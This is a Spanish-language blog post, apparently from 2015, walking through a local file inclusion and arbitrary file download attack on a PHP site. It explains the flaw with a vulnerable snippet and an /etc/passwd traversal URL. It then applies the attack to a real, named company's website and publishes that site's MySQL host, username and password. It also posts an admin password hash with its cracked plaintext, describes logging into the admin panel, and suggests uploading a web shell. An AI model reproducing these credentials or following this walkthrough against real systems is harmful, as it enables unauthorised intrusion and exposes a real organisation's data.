@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Arbitrary File Download - Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="by hdbreakerPara seguir este post necesitamos comprender el concepto de LFI (Local File Inclusion)LFI es un error de programación en php bastante &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/blog/2015/01/12/arbitrary-file-download/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Arbitrary File Download</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-01-12T22:38:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:38 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://www.niper.ac.in/pi_dev_tools/DoPoSe-CYP/images/DPS_download.jpg" height="400" width="397" /></div><div style="text-align: right;"><br /></div><div style="text-align: right;"><b>by hdbreaker</b></div><br />Para seguir este post necesitamos comprender el concepto de LFI (Local File Inclusion)<br /><br />LFI es un error de programación en php bastante comun donde se permite incluir archivos locales del servidor dentro del codigo php de la web afectada<br /><br />Por ej:<br /><br />Include.php<br /><br /><pre class="brush: php">&lt;?php<br />$pagina = $_GET['pagina'];<br />include($pagina);<br />?&gt;<br /><br /></pre>En el source se precia un LFI en el parametro $pagina donde se puede solicitar la inclusión de contenido de otro archivo a través de include().<br /><br />El parametro pagina esta siendo solicitado por medio de una peticion GET por lo que este error se puede explotar de la siguiente manera:<br /><br /><pre class="brush: bash">http://WebVulnerable.com/Include.php?pagina="Archivo a Incluir"<br /></pre><br />Un ejemplo Practico de esto seria:<br /><br /><pre class="brush: bash">http://WebVulnerable.com/Include.php?pagina=../../../../../../../../../etc/passwd</pre><br />esto incluiría el contenido del archivo passwd y lo haria visible dentro de la pagina Include.php<br /><br />El Full Source Disclosure funciona de forma similar ya que incluiremos un archivo dentro de una pagina php de descarga,<br />y de esta forma analizaremos detalladamente el source en nuestra pc buscando información sensible<br /><br />Un Dork Comun para buscar una web vulnerable es:<br /><br /><pre class="brush: bash">inurl:download.php?file=* site:.com.ar</pre><br />Buscamos un objetivo y probamos si es vulnerable, en mi caso elegi:<br /><br /><pre class="brush: bash">www.latinrisk.com.ar/download.php?file=doc/brochure-esp-final.pdf</pre><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i49.tinypic.com/34ozmut.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br /><br />copiamos la url y sustituimos el archivo brochure-esp-final.pdf por download.php<br /><br />www.latinrisk.com.ar/download.php?file=<span style="color: red;">download.php</span><br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i50.tinypic.com/29ckzh4.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br />y vemos como download.php es descargado a nuestro disco duro, analisemos su contenido<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i48.tinypic.com/jgm92g.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br /><br />Como Podremos distinguir esta la clasica falla LFI en su Source<br /><br /><pre class="brush: php">$file = basename($_GET['file']);<br /></pre><br />Esto es lo q nos va a permitir llevar a cabo nuestro ataque. Proseguimos<br />dado que podemos descargar contenido al q no tenemos acceso desde, nuestro querido download.php?file=<br />empezaremos a descargar paginas con contenido importante, Ej.<br /><br />Descargaremos el archivo index.php y analizaremos su contenido<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i48.tinypic.com/33ehjf5.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i46.tinypic.com/35j0ccn.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br /><br />Como podremos Apreciar dentro del source de index.php encontraremos el archivo de configuración inc_loader.php<br /><br /><pre class="brush: php">&lt;? include ('inc_loader.php'); ?&gt;</pre><br />Descargemos y analicemos el Source! <br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i46.tinypic.com/qzgr6e.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i47.tinypic.com/iof7r7.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br /><br />Como podremos ver en el source encontraremos incluidas varios Archivos de Configuración.<br /><br /><pre class="brush: php">include('inc/connect.php');<br />include('inc/func_std.php');<br />include('inc/sanitize.php');<br />include('inc_variables.php');<br /></pre><br />El q nos interesa es inc/connect.php<br /><br />Nuevamente descargamos y analizamos<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://1.bp.blogspot.com/-8mpl-kDuNZ0/VLS6VE2lT6I/AAAAAAAAAGQ/_6_HFBGMu3Y/s1600/aaaa.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://1.bp.blogspot.com/-l66zYGC-zt8/VLS5_6j5MWI/AAAAAAAAAGI/i0hx014i9gk/s1600/eeee.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br />Como veremos en su código empezamos a distinguir sentencias q hacen referencia a la configuración de MySql<br />además distinguimos en el principio del source q se incluye el archivo config.php, Debe ser Interesante su contenido.<br /><br /><pre class="brush: php">include_once('config.php');</pre><br />Descargemos y analicemos!!! (se tiene q respetar el directorio dentro del q nos encontramos por lo tanto la ruta a incluir es inc/config.php)<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://1.bp.blogspot.com/-dgHS2JMO0q8/VLS6iNhQ1gI/AAAAAAAAAGY/3f4CXl79_I8/s1600/tttt.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://4.bp.blogspot.com/-7H5g5saXBwA/VLS6pnRWkkI/AAAAAAAAAGg/F8TaVOkNxv8/s1600/ssss.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br />Y como por arte de magia podemos divisar los usuarios y contraseñas de MySql tanto Locales como remotos<br /><br /><pre class="brush: php">if ($_SERVER['HTTP_HOST'] == 'localhost' || $_SERVER['HTTP_HOST'] == 'server.lan')<br /><br />{<br /><br />&nbsp;&nbsp;&nbsp; $config['mysqlhost'] = 'localhost';<br />&nbsp;&nbsp;&nbsp; $config['mysqluser'] = 'root';<br />&nbsp;&nbsp;&nbsp; $config['mysqlpass'] = '';<br />&nbsp;&nbsp;&nbsp; $config['mysqldb']&nbsp;&nbsp; = 'db_latinrisk';<br />&nbsp;&nbsp;&nbsp; $_URL = 'http://server.lan/latinrisk/web/';<br /><br />}<br /><br />else<br /><br />{<br /><br />//&nbsp; $config['mysqlhost'] = '190.228.29.68';<br />&nbsp;&nbsp;&nbsp; $config['mysqlhost'] = '192.168.0.170';<br />&nbsp;&nbsp;&nbsp; $config['mysqluser'] = 'user_latinrisk';<br />&nbsp;&nbsp;&nbsp; $config['mysqlpass'] = 'Jwe9UoL6';<br />&nbsp;&nbsp;&nbsp; $config['mysqldb']&nbsp;&nbsp; = 'db_latinrisk';<br />&nbsp;&nbsp;&nbsp; $_URL = 'http://www.latin-risk.com/';<br /><br />}</pre><br /><br />Ahora nos fijamos si la web posee phpmyadmin:<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://2.bp.blogspot.com/-EJp_vP83UBQ/VLS7NcPFnpI/AAAAAAAAAGo/2psUffvhHbM/s1600/test.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br />Tristemente la web no tiene phpmyadmin :( pero como somos algo intrepidos y sabemos analizar el codigo vemos q el servidor MySql<br />es accesible desde la siguiente ip Publica 190.228.29.68 con Usuario "user_latinrisk" y password "Jwe9UoL6"<br /><br />Acá la imaginación del hacker, existen varios metodos para acceder remotamente a una base de datos, yo por mi parto Utilizare MySqlNavigaitor<br />(Demas esta decir q el puerto defautl de Coneccion a un servidor MySql es 3306)<br /><br /><div style="text-align: center;"><img border="0" src="http://2.bp.blogspot.com/--CJPNe-0yPw/VLS7X7yCGFI/AAAAAAAAAGw/9SiWY8yIuik/s1600/222.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br />Llenamos los campos Correctamente y damos en Fire :)<br /><br />Podemos ver las bases de datos que se encuentran en el sitio latinrisk.com.ar (empresa que se dedica a "Solventar Vulnerabilidades Informáticas a Empresas" XD)<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://3.bp.blogspot.com/-ykHZzVqMUBY/VLS7tXuoMKI/AAAAAAAAAG4/2qtLVa99_rc/s1600/ff.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br /><br />nos vamos a db_latinrisk/gral_admin y nos encontraremos con los 2 usuarios mas poderosos de esta web<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://4.bp.blogspot.com/-xwhvzV5OFl4/VLS73YBWtiI/AAAAAAAAAHA/XemU4hcK4P8/s1600/tetete.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br />Solo queda desencryptar la pass en md5 de alguno de los 2 usuarios y tendremos acceso al AdminPanel de LatinRisk<br /><br />Para los peresosos: <br /><br /><pre class="brush: bash">admin:a4be08c8f9378e32a2ffad1ab48d3e6 (lr1120)</pre><br />Buscamos el AdminPanel con la tecnica q uds mas prefieran y llegamos a la siguiente dirección<br /><br />http://www.latinrisk.com.ar/admin/<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://2.bp.blogspot.com/-ONDUxXHNkEc/VLS8Dp_AvYI/AAAAAAAAAHI/JFhV4piKdTc/s1600/panel.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br />Ingresamos los datos correspondientes y damos click en Ingresar<br />y podremos apreciar lo siguiente:<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://3.bp.blogspot.com/-hWwvgswapTk/VLS8PZYojfI/AAAAAAAAAHQ/F5miYiJhGK0/s1600/admin.png" height="360" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br /><br />Solo queda Bypassear algun Upload de imagenes y subir nuestra shell<br /><br /><div style="text-align: right;"><b>Happy Hacking!</b></div></div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Security Signal</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-01-12T22:38:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:38 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2015/01/12/arbitrary-file-download/" data-via="" data-counturl="http://securitysignal.github.io/blog/2015/01/12/arbitrary-file-download/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/01/12/pwneando-el-waf/" title="Previous Post: PWNEANDO el WAF!">&laquo; PWNEANDO el WAF!</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/01/13/remote-code-execution/" title="Next Post: Remote Code Execution">Remote Code Execution &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
